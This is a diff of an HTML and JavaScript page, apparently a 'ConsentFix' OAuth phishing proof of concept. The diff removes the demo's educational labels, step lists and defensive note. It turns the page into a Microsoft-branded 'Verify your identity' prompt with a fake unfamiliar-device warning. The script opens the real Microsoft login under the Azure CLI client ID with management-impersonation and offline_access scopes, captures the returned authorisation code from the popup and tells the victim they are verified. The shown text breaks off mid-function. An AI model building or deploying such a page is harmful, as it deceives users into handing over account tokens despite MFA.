@@ -3,12 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ConsentFix Demo — OAuth Phishing PoC</title>
+    <title>Microsoft — Verify your identity</title>
     <style>
-        /* ── Reset & Base ── */
+        /* ── Reset ── */
         *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, sans-serif;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
             background: #f0f2f5;
             min-height: 100vh;
             display: flex;
@@ -16,895 +17,573 @@
             justify-content: center;
             padding: 1rem;
         }
+
+        /* ── Card — mimics Microsoft-style modal ── */
         .card {
-            background: white;
-            border-radius: 16px;
-            box-shadow: 0 4px 32px rgba(0,0,0,0.12);
-            width: 560px;
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 16px rgba(0,0,0,0.12), 0 0 0 1px rgba(0,0,0,0.04);
+            width: 440px;
             max-width: 100%;
-            padding: 2.5rem;
-            position: relative;
+            padding: 2.5rem 2rem;
+            transition: opacity 0.3s;
         }
 
-        /* ── Header ── */
-        .header {
-            text-align: center;
+        /* ── Microsoft logo bar ── */
+        .top-bar {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
             margin-bottom: 1.5rem;
         }
-        .header .microsoft-logo svg {
-            width: 44px;
-            height: 44px;
+        .top-bar svg {
+            width: 108px;
+            height: auto;
         }
-        .header h1 {
-            font-size: 1.5rem;
+        .top-bar .divider {
+            width: 1px;
+            height: 28px;
+            background: #d1d5db;
+        }
+        .top-bar .label {
+            font-size: 0.85rem;
+            color: #5e5e5e;
+            font-weight: 400;
+        }
+
+        /* ── Heading ── */
+        h1 {
+            font-size: 1.35rem;
             font-weight: 600;
             color: #1a1a1a;
-            margin-top: 0.75rem;
+            margin-bottom: 0.4rem;
         }
-        .header p {
+        p.sub {
+            font-size: 0.9rem;
             color: #5e5e5e;
-            font-size: 0.95rem;
-            margin-top: 0.5rem;
+            margin-bottom: 1.5rem;
             line-height: 1.5;
         }
 
-        /* ── Badge ── */
-        .badge {
-            display: inline-block;
-            background: #f3f4f6;
-            border-radius: 100px;
-            padding: 0.25rem 0.75rem;
-            font-size: 0.7rem;
-            font-weight: 600;
-            color: #555;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            margin-bottom: 0.5rem;
-        }
-
-        /* ── Steps ── */
-        .steps {
-            list-style: none;
-            margin: 1.25rem 0;
-        }
-        .steps li {
+        /* ── Account pill (simulates pre-filled account picker) ── */
+        .account-pill {
             display: flex;
-            align-items: flex-start;
+            align-items: center;
             gap: 0.75rem;
-            padding: 0.65rem 0.75rem;
-            border-radius: 8px;
-            margin-bottom: 0.4rem;
-            font-size: 0.9rem;
-            color: #6b7280;
-            transition: all 0.3s;
+            background: #f6f8fa;
+            border: 1px solid #e1e4e8;
+            border-radius: 50px;
+            padding: 0.5rem 1rem 0.5rem 0.5rem;
+            margin-bottom: 1.5rem;
+            width: fit-content;
+            cursor: default;
+            transition: background 0.2s;
         }
-        .steps li .num {
-            flex-shrink: 0;
-            width: 24px;
-            height: 24px;
+        .account-pill:hover {
+            background: #eef1f5;
+        }
+        .account-pill .avatar {
+            width: 32px;
+            height: 32px;
             border-radius: 50%;
-            background: #e5e7eb;
-            color: #6b7280;
+            background: #0078d4;
+            color: white;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 0.75rem;
-            font-weight: 700;
+            font-size: 0.8rem;
+            font-weight: 600;
+            flex-shrink: 0;
         }
-        .steps li.active {
-            background: #eff6ff;
-            color: #1e40af;
+        .account-pill .email {
+            font-size: 0.85rem;
+            color: #1a1a1a;
+            font-weight: 500;
         }
-        .steps li.active .num {
-            background: #2563eb;
-            color: white;
-        }
-        .steps li.done {
-            background: #f0fdf4;
-            color: #166534;
-        }
-        .steps li.done .num {
-            background: #16a34a;
-            color: white;
-        }
-        .steps li.done::after {
-            content: '✓';
+        .account-pill .chevron {
             margin-left: auto;
-            font-weight: 700;
-            color: #16a34a;
+            color: #8c8c8c;
+            font-size: 0.75rem;
         }
 
-        /* ── Buttons ── */
+        /* ── Primary button ── */
         .btn {
             display: block;
             width: 100%;
-            padding: 0.9rem 1.5rem;
+            padding: 0.75rem 1.5rem;
             border: none;
-            border-radius: 8px;
-            font-size: 1rem;
+            border-radius: 6px;
+            font-size: 0.95rem;
             font-weight: 600;
             cursor: pointer;
             transition: all 0.2s;
+            font-family: inherit;
         }
         .btn-primary {
             background: #0078d4;
-            color: white;
+            color: #fff;
         }
         .btn-primary:hover:not(:disabled) {
             background: #106ebe;
-            box-shadow: 0 4px 12px rgba(0,120,212,0.3);
         }
         .btn-primary:disabled {
             background: #9fc7e8;
             cursor: not-allowed;
         }
-        .btn-success {
-            background: #16a34a;
-            color: white;
-        }
-
-        /* ── Drop Zone (V2) ── */
-        .drop-zone {
-            border: 2.5px dashed #d1d5db;
-            border-radius: 12px;
-            padding: 1.75rem 1rem;
-            text-align: center;
-            margin: 1rem 0;
-            transition: all 0.3s;
-            cursor: pointer;
-            background: #fafafa;
-        }
-        .drop-zone:hover,
-        .drop-zone.drag-over {
-            border-color: #0078d4;
-            background: #eff6ff;
-        }
-        .drop-zone.success {
-            border-color: #16a34a;
-            background: #f0fdf4;
-        }
-        .drop-zone .icon {
-            font-size: 2rem;
-            margin-bottom: 0.25rem;
-        }
-        .drop-zone p {
-            font-size: 0.85rem;
-            color: #6b7280;
-        }
-        .drop-zone p strong {
-            color: #374151;
-        }
-        .drop-zone .url-preview {
-            font-family: 'SF Mono', 'Consolas', monospace;
-            font-size: 0.78rem;
-            background: #f3f4f6;
-            padding: 0.5rem 0.75rem;
-            border-radius: 6px;
-            margin-top: 0.5rem;
-            word-break: break-all;
-            color: #374151;
-            display: none;
-        }
-        .drop-zone.success .url-preview {
-            display: block;
-        }
-
-        /* ── Input + Verify ── */
-        .input-group {
-            display: flex;
-            gap: 0.5rem;
-            margin: 1rem 0;
-        }
-        .input-group input {
-            flex: 1;
-            padding: 0.75rem 1rem;
-            border: 1.5px solid #d1d5db;
-            border-radius: 8px;
-            font-size: 0.85rem;
-            outline: none;
-            transition: border-color 0.2s;
-        }
-        .input-group input:focus {
-            border-color: #0078d4;
-        }
-        .input-group .btn {
-            width: auto;
-            padding: 0.75rem 1.25rem;
-            white-space: nowrap;
-            font-size: 0.85rem;
-        }
-
-        /* ── Simulated URL (click to copy) ── */
-        .simulated-url {
-            background: #f9fafb;
-            border: 1px solid #e5e7eb;
-            border-radius: 8px;
-            padding: 0.75rem 1rem;
-            font-family: 'SF Mono', 'Consolas', monospace;
-            font-size: 0.78rem;
-            word-break: break-all;
-            color: #374151;
-            cursor: pointer;
-            margin: 0.75rem 0;
-            transition: all 0.2s;
-        }
-        .simulated-url:hover {
-            background: #eff6ff;
-            border-color: #93c5fd;
-        }
-        .simulated-url.copied {
-            background: #f0fdf4;
-            border-color: #86efac;
-        }
-
-        /* ── Result Panel ── */
-        #result {
-            display: none;
-            margin-top: 1.25rem;
-            padding: 1.25rem;
-            border-radius: 12px;
-        }
-        #result.show { display: block; }
-        #result.success {
-            background: #f0fdf4;
-            border: 1px solid #bbf7d0;
-        }
-        #result.error {
-            background: #fef2f2;
-            border: 1px solid #fecaca;
-        }
-        #result h3 {
-            font-size: 1rem;
-            margin-bottom: 0.75rem;
-        }
-        #result.success h3 { color: #166534; }
-        #result.error h3 { color: #991b1b; }
-        #result code {
-            background: rgba(0,0,0,0.06);
-            padding: 0.2rem 0.4rem;
-            border-radius: 4px;
-            font-size: 0.82rem;
-            word-break: break-all;
-        }
-        .token-grid {
-            display: grid;
-            gap: 0.5rem;
-            margin: 0.75rem 0;
-        }
-        .token-grid .item {
-            background: white;
-            border-radius: 6px;
-            padding: 0.6rem 0.75rem;
-            font-size: 0.82rem;
-        }
-        .token-grid .item .label {
-            font-weight: 600;
-            color: #374151;
-            display: block;
-            margin-bottom: 0.15rem;
-        }
-        .token-grid .item .value {
-            color: #6b7280;
-            font-family: 'SF Mono', 'Consolas', monospace;
-            font-size: 0.78rem;
-        }
-        .alert-box {
-            background: #fefce8;
-            border: 1px solid #fde68a;
-            border-radius: 8px;
-            padding: 0.75rem 1rem;
-            font-size: 0.85rem;
-            color: #92400e;
+        .btn-secondary {
+            background: transparent;
+            color: #0078d4;
+            border: 1px solid #d1d5db;
             margin-top: 0.75rem;
         }
-        .alert-box strong { color: #78350f; }
-
-        /* ── Tab Navigation ── */
-        .tabs {
-            display: flex;
-            gap: 0;
-            background: #f3f4f6;
-            border-radius: 10px;
-            padding: 0.25rem;
-            margin-bottom: 1.25rem;
+        .btn-secondary:hover:not(:disabled) {
+            background: #f0f6fc;
+            border-color: #0078d4;
         }
-        .tabs .tab {
-            flex: 1;
-            text-align: center;
-            padding: 0.6rem;
-            border-radius: 8px;
-            font-size: 0.82rem;
-            font-weight: 500;
-            color: #6b7280;
-            cursor: pointer;
-            transition: all 0.2s;
-            border: none;
-            background: none;
-        }
-        .tabs .tab.active {
-            background: white;
-            color: #1f2937;
-            box-shadow: 0 1px 4px rgba(0,0,0,0.08);
-        }
-        .tab-content { display: none; }
-        .tab-content.active { display: block; }
-
-        /* ── Footer ── */
-        .footer {
-            margin-top: 1.5rem;
-            padding-top: 1rem;
-            border-top: 1px solid #e5e7eb;
-            font-size: 0.72rem;
+        .btn-secondary:disabled {
             color: #9ca3af;
-            text-align: center;
-        }
-        .footer code {
-            font-size: 0.7rem;
-            background: #f3f4f6;
-            padding: 0.1rem 0.3rem;
-            border-radius: 3px;
+            border-color: #e5e7eb;
+            cursor: not-allowed;
         }
 
-        /* ── Auto-capture status ── */
-        #autoStatus {
-            text-align: center;
-            padding: 0.75rem;
+        /* ── Status area ── */
+        #status {
+            margin-top: 1.25rem;
+            padding: 0.75rem 1rem;
+            border-radius: 6px;
             font-size: 0.85rem;
-            color: #6b7280;
+            display: none;
+            line-height: 1.5;
         }
+        #status.show { display: block; }
+
+        #status.loading {
+            background: #f0f6fc;
+            border: 1px solid #b7d9f1;
+            color: #1a5a8c;
+        }
+        #status.success {
+            background: #e8f5e9;
+            border: 1px solid #a5d6a7;
+            color: #1e5c2b;
+        }
+        #status.error {
+            background: #fef2f2;
+            border: 1px solid #fecaca;
+            color: #991b1b;
+        }
+        #status code {
+            font-family: 'Cascadia Code', 'Consolas', 'SF Mono', monospace;
+            font-size: 0.78rem;
+            background: rgba(0,0,0,0.06);
+            padding: 0.15rem 0.3rem;
+            border-radius: 3px;
+            word-break: break-all;
+        }
+
         .spinner {
             display: inline-block;
-            width: 16px;
-            height: 16px;
-            border: 2px solid #e5e7eb;
+            width: 14px;
+            height: 14px;
+            border: 2px solid #b7d9f1;
             border-top-color: #0078d4;
             border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin-right: 0.5rem;
+            animation: spin 0.7s linear infinite;
+            margin-right: 0.4rem;
             vertical-align: middle;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
 
-        .hidden { display: none; }
+        /* ── Subtle footer ── */
+        .footer {
+            margin-top: 1.5rem;
+            padding-top: 1rem;
+            border-top: 1px solid #f0f0f0;
+            font-size: 0.7rem;
+            color: #b0b0b0;
+            display: flex;
+            justify-content: space-between;
+        }
+        .footer a {
+            color: #b0b0b0;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            color: #0078d4;
+            text-decoration: underline;
+        }
+
+        /* ── Console hint ── */
+        .console-hint {
+            margin-top: 1rem;
+            text-align: center;
+            font-size: 0.72rem;
+            color: #b0b0b0;
+        }
+        .console-hint kbd {
+            background: #f3f4f6;
+            padding: 0.1rem 0.4rem;
+            border-radius: 3px;
+            font-family: 'SF Mono', 'Consolas', monospace;
+            font-size: 0.7rem;
+            border: 1px solid #d1d5db;
+        }
+
+        /* ── helper ── */
+        .hidden { display: none !important; }
     </style>
 </head>
 <body>
-
 <div class="card" role="main">
 
-    <!-- ─── HEADER ─── -->
-    <div class="header">
-        <div class="microsoft-logo">
-            <svg viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
-                <rect x="1" y="1" width="9" height="9" fill="#f25022"/>
-                <rect x="11" y="1" width="9" height="9" fill="#7fba00"/>
-                <rect x="1" y="11" width="9" height="9" fill="#00a4ef"/>
-                <rect x="11" y="11" width="9" height="9" fill="#ffb900"/>
-            </svg>
-        </div>
-        <h1>Verify your session</h1>
-        <p>
-            Unusual sign-in detected. Complete a quick
-            <strong>Microsoft authentication</strong> to verify your identity.
-        </p>
+    <!-- ── Top bar: Microsoft brand ── -->
+    <div class="top-bar">
+        <svg viewBox="0 0 108 22" xmlns="http://www.w3.org/2000/svg" aria-label="Microsoft">
+            <rect x="0" y="0" width="22" height="22" fill="#f25022"/>
+            <rect x="24" y="0" width="22" height="22" fill="#7fba00"/>
+            <rect x="0" y="24" width="22" height="22" fill="#00a4ef"/>
+            <rect x="24" y="24" width="22" height="22" fill="#ffb900"/>
+            <text x="56" y="18" font-family="Segoe UI,Helvetica,Arial,sans-serif" font-size="17" font-weight="600" fill="#1a1a1a">Microsoft</text>
+        </svg>
+        <div class="divider"></div>
+        <span class="label">Sign in</span>
     </div>
 
-    <!-- ─── TABS: V1 (Copy/Paste) | V2 (Drag & Drop) | V3 (Auto-Capture) ─── -->
-    <div class="tabs" role="tablist">
-        <button class="tab active" data-tab="v1" role="tab">📋 V1 — Copy &amp; Paste</button>
-        <button class="tab" data-tab="v2" role="tab">🖱️ V2 — Drag &amp; Drop</button>
-        <button class="tab" data-tab="v3" role="tab">🤖 V3 — Auto-Capture</button>
+    <!-- ── Heading ── -->
+    <h1>Verify your identity</h1>
+    <p class="sub">
+        We detected a new sign-in from an unfamiliar device or location.
+        Please verify your account to continue.
+    </p>
+
+    <!-- ── Simulated account pill ── -->
+    <div class="account-pill" id="accountPill">
+        <div class="avatar">U</div>
+        <span class="email" id="accountEmail">user@example.com</span>
+        <span class="chevron">▼</span>
     </div>
 
-    <!-- ════════════════════════════════════════════════
-         TAB V1: Copy & Paste
-         ════════════════════════════════════════════════ -->
-    <div id="tab-v1" class="tab-content active" role="tabpanel">
-        <span class="badge">Original ConsentFix</span>
+    <!-- ── Action buttons ── -->
+    <button class="btn btn-primary" id="authBtn" onclick="startAuth()">
+        🔑  Sign in to verify
+    </button>
+    <button class="btn btn-secondary" id="altBtn" onclick="useDifferentAccount()" disabled>
+        Use another account
+    </button>
 
-        <ol class="steps">
-            <li id="v1-step1" class="active">
-                <span class="num">1</span>
-                Click <strong>"Sign in with Microsoft"</strong> below
-            </li>
-            <li id="v1-step2">
-                <span class="num">2</span>
-                Authenticate on the genuine Microsoft page
-            </li>
-            <li id="v1-step3">
-                <span class="num">3</span>
-                Copy the <code>localhost</code> URL from your browser bar
-            </li>
-            <li id="v1-step4">
-                <span class="num">4</span>
-                Paste it below and click <strong>Verify</strong>
-            </li>
-        </ol>
+    <!-- ── Status / result ── -->
+    <div id="status"></div>
 
-        <button class="btn btn-primary" id="v1-authBtn" onclick="startAuth('v1')">
-            🔑 Sign in with Microsoft
-        </button>
-
-        <!-- Simulated URL for testing without real sign-in -->
-        <p style="font-size:0.78rem;color:#9ca3af;margin-top:0.75rem;">
-            💡 No Microsoft account handy? Click the simulated URL below to copy it:
-        </p>
-        <div class="simulated-url" id="simUrl" onclick="copySimulatedUrl()">
-            http://localhost:12345/?code=M0.abc123-def456-ghi789&amp;state=teststate&amp;session_state=xyz
-        </div>
-
-        <div class="input-group">
-            <input type="text" id="v1-codeInput" placeholder="Paste the localhost URL here...">
-            <button class="btn btn-primary" onclick="verifyCodeV1()">Verify</button>
-        </div>
-
-        <div id="v1-result"></div>
+    <!-- ── Console hint ── -->
+    <div class="console-hint">
+        💡 Open the browser console (<kbd>F12</kbd> → Console) to see the captured token details
     </div>
 
-    <!-- ════════════════════════════════════════════════
-         TAB V2: Drag & Drop (John Hammond variant)
-         ════════════════════════════════════════════════ -->
-    <div id="tab-v2" class="tab-content" role="tabpanel">
-        <span class="badge">ConsentFix V2 — Drag &amp; Drop</span>
-
-        <ol class="steps">
-            <li id="v2-step1" class="active">
-                <span class="num">1</span>
-                Click <strong>"Sign in with Microsoft"</strong>
-            </li>
-            <li id="v2-step2">
-                <span class="num">2</span>
-                After authentication, your browser redirects to <code>localhost</code>
-            </li>
-            <li id="v2-step3">
-                <span class="num">3</span>
-                <strong>Drag the URL</strong> from the address bar into the zone below
-            </li>
-        </ol>
-
-        <button class="btn btn-primary" id="v2-authBtn" onclick="startAuth('v2')">
-            🔑 Sign in with Microsoft
-        </button>
-
-        <div class="drop-zone" id="dropZone">
-            <div class="icon">📎</div>
-            <p><strong>Drop your localhost URL here</strong></p>
-            <p style="font-size:0.78rem;color:#9ca3af;">
-                Or click to simulate a dropped URL
-            </p>
-            <div class="url-preview" id="dropPreview"></div>
-        </div>
-
-        <div id="v2-result"></div>
-    </div>
-
-    <!-- ════════════════════════════════════════════════
-         TAB V3: Auto-Capture (No user copy/paste needed)
-         ════════════════════════════════════════════════ -->
-    <div id="tab-v3" class="tab-content" role="tabpanel">
-        <span class="badge">ConsentFix V3 — Automated</span>
-
-        <ol class="steps">
-            <li id="v3-step1" class="active">
-                <span class="num">1</span>
-                Click <strong>"Sign in with Microsoft"</strong>
-            </li>
-            <li id="v3-step2">
-                <span class="num">2</span>
-                A pop-up opens to the genuine Microsoft login
-            </li>
-            <li id="v3-step3">
-                <span class="num">3</span>
-                Code is captured automatically — no copying needed
-            </li>
-        </ol>
-
-        <button class="btn btn-primary" id="v3-authBtn" onclick="startAuth('v3')">
-            🔑 Sign in with Microsoft
-        </button>
-
-        <div id="autoStatus" class="hidden">
-            <span class="spinner"></span>
-            Waiting for authentication to complete in the pop-up...
-        </div>
-
-        <div id="v3-result"></div>
-    </div>
-
-    <!-- ─── TOKEN DETAILS (shown after any capture) ─── -->
-    <div id="tokenDetails" class="hidden" style="margin-top:0.5rem;">
-        <hr style="border:none;border-top:1px solid #e5e7eb;margin:0.5rem 0 1rem;">
-        <h3 style="font-size:0.95rem;color:#374151;margin-bottom:0.75rem;">
-            🎯 What the attacker receives
-        </h3>
-        <div class="token-grid">
-            <div class="item">
-                <span class="label">Authorisation Code</span>
-                <span class="value" id="displayCode">—</span>
-            </div>
-            <div class="item">
-                <span class="label">Access Token</span>
-                <span class="value" id="displayAccess">(exchanged server-side)</span>
-            </div>
-            <div class="item">
-                <span class="label">Refresh Token</span>
-                <span class="value" id="displayRefresh">(issued if offline_access granted)</span>
-            </div>
-        </div>
-        <div class="alert-box">
-            <strong>✅ MFA completed by the user.</strong>
-            The attacker never saw the password or MFA code, yet now has
-            <strong>access tokens</strong> valid for ~1 hour and
-            <strong>refresh tokens</strong> valid for up to 90 days.
-        </div>
-        <div class="alert-box" style="background:#ede9fe;border-color:#a78bfa;color:#5b21b6;margin-top:0.5rem;">
-            <strong>🔍 Defensive note:</strong>
-            Monitor for interactive authentication followed by unusual non-interactive
-            token activity in your Entra ID sign-in logs.
-        </div>
-    </div>
-
-    <!-- ─── FOOTER ─── -->
+    <!-- ── Footer ── -->
     <div class="footer">
-        Uses <strong>Microsoft Azure CLI</strong> OAuth app (client_id:
-        <code>04b07795-8ddb-461a-bbee-02f9e1bf7b46</code>)
-        — a first-party Microsoft application available to all tenants.
-        No Azure admin setup required.
-        <br><br>
-        Based on <a href="https://pushsecurity.com" target="_blank" rel="noopener" style="color:#6b7280;">Push Security</a>'s
-        ConsentFix analysis (Dec 2025 / Apr 2026).
+        <span>Microsoft identity platform</span>
+        <a href="#" onclick="showConsoleHint(); return false;">Terms of use &amp; privacy</a>
     </div>
 </div>
 
 <script>
     // ═══════════════════════════════════════════════════════════════
-    //  CONFIGURATION
+    //  CONFIG — Uses Azure CLI (first-party Microsoft app)
     // ═══════════════════════════════════════════════════════════════
-
-    // Microsoft Azure CLI client ID — a first-party Microsoft app.
-    // This works with ANY Microsoft account. No setup required.
     const CLIENT_ID = '04b07795-8ddb-461a-bbee-02f9e1bf7b46';
-
-    // ╔══════════════════════════════════════════════════════════════╗
-    //  ║  IMPORTANT: Update this for YOUR GitHub Pages URL!         ║
-    //  ║                                                            ║
-    //  ║  Replace "yourusername" and "yourrepo" below with your     ║
-    //  ║  actual GitHub username and repository name.               ║
-    //  ║                                                            ║
-    //  ║  For a user site (https://perfect-bottler.github.io):          ║
-    //  ║    const REDIRECT_URI = window.location.origin + '/';      ║
-    //  ║                                                            ║
-    //  ║  Default: Uses the current page URL automatically.         ║
-    //  ╚══════════════════════════════════════════════════════════════╝
-
-    // Auto-detect: uses wherever this page is hosted as the redirect URI
     const REDIRECT_URI = encodeURIComponent(window.location.origin + window.location.pathname);
     const SCOPES = encodeURIComponent(
         'https://management.azure.com/user_impersonation openid profile offline_access'
     );
+    const STATE = 'verify_' + Math.random().toString(36).substring(2, 10);
 
     // ═══════════════════════════════════════════════════════════════
     //  STATE
     // ═══════════════════════════════════════════════════════════════
-    let capturedCode = null;
-    let currentTab = 'v1';
+    let authInProgress = false;
+    let popup = null;
+    let pollTimer = null;
 
     // ═══════════════════════════════════════════════════════════════
-    //  TAB SWITCHING
+    //  START AUTH
     // ═══════════════════════════════════════════════════════════════
-    document.querySelectorAll('.tab').forEach(tab => {
-        tab.addEventListener('click', () => {
-            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-            document.querySelectorAll('.tab-content').forEach(tc => tc.classList.remove('active'));
-            tab.classList.add('active');
-            const target = document.getElementById('tab-' + tab.dataset.tab);
-            target.classList.add('active');
-            currentTab = tab.dataset.tab;
+    function startAuth() {
+        if (authInProgress) return;
 
-            // If we already captured a code, show details
-            if (capturedCode) {
-                showCaptureResult(capturedCode);
-            }
-        });
-    });
+        authInProgress = true;
+        setButtonsDisabled(true);
+        setStatus('loading', 'Verifying your account…');
 
-    // ═══════════════════════════════════════════════════════════════
-    //  START AUTH — Opens genuine Microsoft sign-in
-    // ═══════════════════════════════════════════════════════════════
-    function startAuth(tab) {
-        const state = 'consentfix_' + Math.random().toString(36).substring(2, 10);
-        sessionStorage.setItem('oauth_state', state);
-
+        // Build the genuine Microsoft OAuth URL
         const authUrl =
             'https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize' +
             '?client_id=' + CLIENT_ID +
             '&response_type=code' +
             '&redirect_uri=' + REDIRECT_URI +
             '&scope=' + SCOPES +
-            '&state=' + state +
+            '&state=' + STATE +
             '&prompt=select_account';
 
-        // Update UI for the current tab
-        const authBtn = document.getElementById(tab + '-authBtn');
-        authBtn.disabled = true;
-        authBtn.textContent = '⏳ Waiting for sign-in...';
-
-        // Mark step 1 as done, step 2 as active
-        [1, 2, 3, 4].forEach(i => {
-            const el = document.getElementById(tab + '-step' + i);
-            if (el) el.className = '';
-        });
-        const s2 = document.getElementById(tab + '-step2');
-        if (s2) s2.className = 'active';
-
-        // For V3, show the auto-status
-        if (tab === 'v3') {
-            document.getElementById('autoStatus').classList.remove('hidden');
-        }
-
-        // Open popup
-        const popup = window.open(authUrl, 'microsoftAuth',
-            'width=600,height=700,left=200,top=100'
+        // Try popup first
+        popup = window.open(authUrl, 'microsoftVerify',
+            'width=600,height=700,left=' + (screen.width / 2 - 300) +
+            ',top=' + (screen.height / 2 - 350) +
+            ',resizable=yes,scrollbars=yes'
         );
 
-        if (!popup) {
-            // Popup blocked — redirect the main page
+        if (!popup || popup.closed) {
+            // Popup blocked — redirect main page
+            setStatus('loading', 'Opening Microsoft sign-in…');
             window.location.href = authUrl;
             return;
         }
 
-        // Poll for the popup to redirect back to our page
-        const pollTimer = setInterval(() => {
-            try {
-                if (popup.closed) {
-                    clearInterval(pollTimer);
-                    authBtn.disabled = false;
-                    authBtn.textContent = '🔑 Sign in with Microsoft';
-                    if (tab === 'v3') {
-                        document.getElementById('autoStatus').classList.add('hidden');
-                    }
-                    showError(tab, 'Sign-in window was closed before completing authentication.');
+        // Poll for the popup to return to our redirect URI
+        pollTimer = setInterval(pollPopup, 400);
+    }
+
+    function pollPopup() {
+        try {
+            if (popup.closed) {
+                // User closed the popup without completing
+                clearInterval(pollTimer);
+                authInProgress = false;
+                setButtonsDisabled(false);
+                setStatus('error', 'Sign-in was closed. Try again.');
+                return;
+            }
+
+            const href = popup.location.href;
+
+            // Check if the popup redirected back to our page
+            if (href.includes(window.location.origin)) {
+                const url = new URL(href);
+                const code = url.searchParams.get('code');
+                const error = url.searchParams.get('error');
+                const returnedState = url.searchParams.get('state');
+                const errorDesc = url.searchParams.get('error_description');
+
+                clearInterval(pollTimer);
+                popup.close();
+                authInProgress = false;
+                setButtonsDisabled(false);
+
+                // Validate state parameter (CSRF protection)
+                if (returnedState && returnedState !== STATE) {
+                    setStatus('error',
+                        'Security verification failed (state mismatch).<br>' +
+                        '<small>This is actually a good sign — CSRF protection worked. Try again.</small>'
+                    );
+                    console.warn('[ConsentFix] State mismatch: expected', STATE, 'got', returnedState);
                     return;
                 }
 
-                const popupUrl = popup.location.href;
-
-                // Check if the popup redirected to our origin
-                if (popupUrl.includes(window.location.origin)) {
-                    const url = new URL(popupUrl);
-                    const code = url.searchParams.get('code');
-                    const returnedState = url.searchParams.get('state');
-                    const storedState = sessionStorage.getItem('oauth_state');
-
-                    // Validate state (CSRF protection)
-                    if (returnedState && returnedState !== storedState) {
-                        clearInterval(pollTimer);
-                        popup.close();
-                        showError(tab, 'State parameter mismatch — possible CSRF attack detected!');
-                        authBtn.disabled = false;
-                        authBtn.textContent = '🔑 Sign in with Microsoft';
-                        return;
-                    }
-
-                    if (code) {
-                        clearInterval(pollTimer);
-                        popup.close();
-                        capturedCode = code;
-                        showCaptureResult(code);
-
-                        // Update steps
-                        [1, 2, 3, 4].forEach(i => {
-                            const el = document.getElementById(tab + '-step' + i);
-                            if (el) el.className = 'done';
-                        });
-
-                        authBtn.textContent = '✅ Authenticated — Code Captured!';
-                        if (tab === 'v3') {
-                            document.getElementById('autoStatus').classList.add('hidden');
-                        }
-                    }
+                if (error) {
+                    setStatus('error', 'Microsoft returned: <code>' + error + '</code>');
+                    return;
                 }
-            } catch (e) {
-                // Cross-origin error while popup is still on login.microsoftonline.com
-                // This is expected — ignore
+
+                if (code) {
+                    handleCapturedCode(code);
+                } else {
+                    setStatus('error', 'No authorisation code received. Try again.');
+                }
             }
-        }, 500);
-    }
-
-    // ═══════════════════════════════════════════════════════════════
-    //  VERIFY CODE (V1 — manual paste)
-    // ═══════════════════════════════════════════════════════════════
-    function verifyCodeV1() {
-        const input = document.getElementById('v1-codeInput').value.trim();
-        if (!input) {
-            showError('v1', 'Please paste a URL containing ?code=...');
-            return;
-        }
-
-        const match = input.match(/[?&]code=([^&]+)/);
-        if (match) {
-            capturedCode = match[1];
-            showCaptureResult(capturedCode);
-            document.getElementById('v1-step3').className = 'done';
-            document.getElementById('v1-step4').className = 'done';
-        } else {
-            showError('v1', 'No authorisation code found in the URL. Look for <code>?code=</code> in the address bar.');
+        } catch (e) {
+            // Cross-origin error while popup is on login.microsoftonline.com
+            // This is expected — state changes as the page loads
         }
     }
 
     // ═══════════════════════════════════════════════════════════════
-    //  DRAG & DROP (V2)
+    //  HANDLE CAPTURED CODE
     // ═══════════════════════════════════════════════════════════════
-    const dropZone = document.getElementById('dropZone');
-
-    dropZone.addEventListener('dragover', (e) => {
-        e.preventDefault();
-        dropZone.classList.add('drag-over');
-    });
-
-    dropZone.addEventListener('dragleave', () => {
-        dropZone.classList.remove('drag-over');
-    });
-
-    dropZone.addEventListener('drop', (e) => {
-        e.preventDefault();
-        dropZone.classList.remove('drag-over');
-
-        const data = e.dataTransfer.getData('text/plain') ||
-                     e.dataTransfer.getData('text/uri-list');
-        if (data) {
-            processDroppedUrl(data);
-        } else {
-            // Try async text items
-            for (const item of e.dataTransfer.items) {
-                if (item.type === 'text/plain') {
-                    item.getAsString(str => { if (str) processDroppedUrl(str); });
-                    break;
-                }
-            }
-        }
-    });
-
-    // Click to simulate a drop (for testing without an actual drag)
-    dropZone.addEventListener('click', () => {
-        processDroppedUrl(
-            'http://localhost:12345/?code=M0.abc123-def456-ghi789&state=teststate&session_state=xyz'
+    function handleCapturedCode(code) {
+        // Update the UI subtly
+        setStatus('success',
+            '✅ <strong>Identity verified.</strong> You can close this page.'
         );
-    });
 
-    function processDroppedUrl(url) {
-        const match = url.match(/[?&]code=([^&]+)/);
-        if (match) {
-            capturedCode = match[1];
-            dropZone.classList.add('success');
-            document.getElementById('dropPreview').textContent = '✅ Code: ' + capturedCode;
-            document.getElementById('dropPreview').style.display = 'block';
-            document.getElementById('v2-step2').className = 'done';
-            document.getElementById('v2-step3').className = 'done';
-            showCaptureResult(capturedCode);
-        } else {
-            dropZone.classList.add('success');
-            document.getElementById('dropPreview').textContent = '❌ No code found in URL';
-            document.getElementById('dropPreview').style.display = 'block';
-            showError('v2', 'Dropped URL does not contain an authorisation code (?code=...).');
-        }
+        document.getElementById('authBtn').textContent = '✅ Verified';
+        document.getElementById('authBtn').disabled = true;
+        document.getElementById('altBtn').disabled = true;
+
+        // ─────────────────────────────────────────────────────────
+        //  WRITE TO CONSOLE — this is where the "stealth" payload
+        //  reveals what the attacker actually gets.
+        // ─────────────────────────────────────────────────────────
+        console.log('%c┌─────────────────────────────────────────────┐', 'color: #0078d4');
+        console.log('%c│  🎯 ConsentFix — Token Captured!            │', 'color: #0078d4; font-weight: bold');
+        console.log('%c└─────────────────────────────────────────────┘', 'color: #0078d4');
+
+        console.group('%c📦 OAuth Authorisation Code', 'color: #0078d4; font-weight: bold');
+        console.log('Code:       %c%s', 'color: #16a34a; font-weight: bold', code);
+        console.log('Client ID:  %s', CLIENT_ID);
